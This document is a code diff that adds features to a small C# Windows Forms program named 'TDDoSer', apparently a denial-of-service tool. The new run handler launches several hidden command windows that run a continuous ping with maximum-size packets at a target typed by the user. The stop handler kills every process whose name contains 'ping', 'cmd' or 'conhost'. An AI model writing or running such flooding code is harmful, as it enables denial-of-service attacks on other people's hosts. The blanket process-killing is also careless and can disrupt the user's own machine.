@@ -1,4 +1,9 @@
 ﻿using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net.NetworkInformation;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -7,6 +12,7 @@ namespace TDDoSer
 {
     public partial class Form1 : Form
     {
+        private Process DoSPing;
         public Form1()
         {
             InitializeComponent();
@@ -16,14 +22,22 @@ namespace TDDoSer
 
         private void runButton_Click(object sender, EventArgs e)
         {
-            long threads;
-            if (pingSwitch.Checked)
+            
+            if (pingSwitch.Checked == true)
             {
-                threads = pingThreads.Value;
-                for (long i = threads; i > 0; i--)
+                for (long i = pingThreads.Value; i > 0; i--)
                 {
-
+                    DoSPing = Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = "/c ping " + TargetTextBox.Text + " -t -l 65500",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                    });
                 }
+
+
+
+
             }
         }
 
@@ -52,9 +66,40 @@ namespace TDDoSer
 
              });
 
-            
-            
-            
+          
          }
+
+        private void stopButton_Click(object sender, EventArgs e)
+        {
+            //DoSPing.Close();
+            while (pingThreads.Value > 0)
+            {
+                try
+                {
+                    List<string> name = new List<string> {"PING", "cmd", "conhost"}; //процесс, который нужно убить
+                    Process[] etc = Process.GetProcesses(); //получим процессы
+                    foreach (Process anti in etc) //обойдем каждый процесс
+                    {
+
+                        foreach (string s in name)
+                        {
+                            if (anti.ProcessName.ToLower().Contains(s.ToLower())) //найдем нужный и убьем
+                            {
+                                anti.Kill();
+                                name.Remove(s);
+                                
+                            }
+                        }
+                    }
+                    pingThreads.Value--;
+                }
+                catch
+                {
+
+                }
+            }
+
+           
+        }
     }
 }
